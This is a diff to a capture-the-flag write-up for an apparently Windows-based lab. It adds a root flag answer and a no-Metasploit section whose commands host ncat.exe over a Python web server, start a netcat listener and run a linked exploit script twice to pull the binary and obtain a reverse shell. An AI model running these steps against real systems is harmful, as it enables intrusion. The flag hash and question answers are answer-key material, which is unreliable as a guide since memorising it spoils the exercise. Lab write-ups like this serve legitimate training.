@@ -67,3 +67,23 @@ type root.txt
 
 > - **What is the root flag?**
 >> 9af5f314f57607c00fd09803a587db80
+
+## ACCESS AND ESCALATION WITHOUT METASPLOIT
+
+Download a static netcat binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)
+
+Then start a simple http service with python.\
+`python3 -m http.server 80`
+
+Then as usual we need to set up a listener.\
+`nc -lnvp 9001`
+
+Then using this [exploit](exploit.py), we run the command\
+`python exploit.py $IP 8080`
+
+We need to run it twice for it to work. First time it will request the nc.exe from our server then second time we will get a shell on our listener.
+
+> - **What powershell -c command could we run to manually find out the service name?**
+>> powershell -c Get-Service
+
+Then we just repeat the same process as above to escalate to admin.
